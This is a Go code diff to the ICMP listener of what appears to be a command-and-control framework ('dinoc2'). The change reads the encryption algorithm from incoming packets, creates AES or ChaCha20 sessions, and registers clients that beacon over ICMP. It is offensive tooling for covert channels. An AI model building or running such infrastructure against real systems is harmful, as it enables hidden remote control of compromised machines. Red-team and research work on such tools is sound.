@@ -9,6 +9,7 @@ import (
 
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
+	"dinoc2/pkg/client"
 	"dinoc2/pkg/crypto"
 	"dinoc2/pkg/protocol"
 )
@@ -196,30 +197,69 @@ func (l *ICMPListener) processPacket(packet []byte, addr net.Addr) {
 		// Generate a session ID based on the connection address and echo ID
 		sessionID := crypto.SessionID(fmt.Sprintf("%s-%d", addr.String(), echo.ID))
 		
-		// Create a session with AES encryption (default)
-		err := protocolHandler.CreateSession(sessionID, crypto.AlgorithmAES)
-		if err != nil {
-			fmt.Printf("Error creating session for ICMP data: %v\n", err)
-			return
-		}
-		
 		// Process the data if it's long enough to be a valid packet
 		// HeaderSize is 12 bytes based on protocol/encoder.go
 		if len(data) > 12 {
-			// Decode the packet
+			// Decode the packet to get the encryption algorithm
 			packet, err := protocol.DecodePacket(data)
 			if err != nil {
 				fmt.Printf("Error decoding ICMP packet data: %v\n", err)
-			} else {
-				// Handle packet based on type
-				switch packet.Header.Type {
-				case protocol.PacketTypeKeyExchange:
-					fmt.Printf("Received key exchange from %s via ICMP\n", addr)
-				case protocol.PacketTypeHeartbeat:
-					fmt.Printf("Received heartbeat from %s via ICMP\n", addr)
-				default:
-					fmt.Printf("Received packet type %d from %s via ICMP\n", packet.Header.Type, addr)
+				return
+			}
+			
+			// Determine the encryption algorithm from the packet header
+			var encAlgorithm string
+			var cryptoAlgorithm crypto.Algorithm
+			switch packet.Header.EncAlgorithm {
+			case protocol.EncryptionAlgorithmAES:
+				encAlgorithm = "aes"
+				cryptoAlgorithm = crypto.AlgorithmAES
+			case protocol.EncryptionAlgorithmChacha20:
+				encAlgorithm = "chacha20"
+				cryptoAlgorithm = crypto.AlgorithmChacha20
+			default:
+				encAlgorithm = "aes" // Default to AES if not specified
+				cryptoAlgorithm = crypto.AlgorithmAES
+			}
+			
+			fmt.Printf("Detected encryption algorithm for ICMP request: %s\n", encAlgorithm)
+			
+			// Create a session with the detected encryption algorithm
+			err = protocolHandler.CreateSession(sessionID, cryptoAlgorithm)
+			if err != nil {
+				fmt.Printf("Error creating session for ICMP data with %s: %v\n", encAlgorithm, err)
+				return
+			}
+			
+			// Get the client manager from the options if available
+			if l.config.Options != nil {
+				if clientManager, ok := l.config.Options["client_manager"]; ok {
+					// Create a new client with the detected encryption algorithm
+					config := client.DefaultConfig()
+					config.ServerAddress = l.config.ListenAddress
+					config.EncryptionAlg = encAlgorithm
+					
+					newClient, err := client.NewClient(config)
+					if err != nil {
+						fmt.Printf("Error creating client: %v\n", err)
+					} else {
+						// Register the client with the client manager
+						if cm, ok := clientManager.(interface{ RegisterClient(*client.Client) string }); ok {
+							clientID := cm.RegisterClient(newClient)
+							fmt.Printf("Registered ICMP client with ID %s using %s encryption\n", clientID, encAlgorithm)
+						}
+					}
 				}
+			}
+			
+			// Handle packet based on type
+			switch packet.Header.Type {
+			case protocol.PacketTypeKeyExchange:
+				fmt.Printf("Received key exchange from %s via ICMP\n", addr)
+			case protocol.PacketTypeHeartbeat:
+				fmt.Printf("Received heartbeat from %s via ICMP\n", addr)
+			default:
+				fmt.Printf("Received packet type %d from %s via ICMP\n", packet.Header.Type, addr)
 			}
 		} else {
 			fmt.Printf("Received ICMP echo request from %s (data too short for protocol)\n", addr)
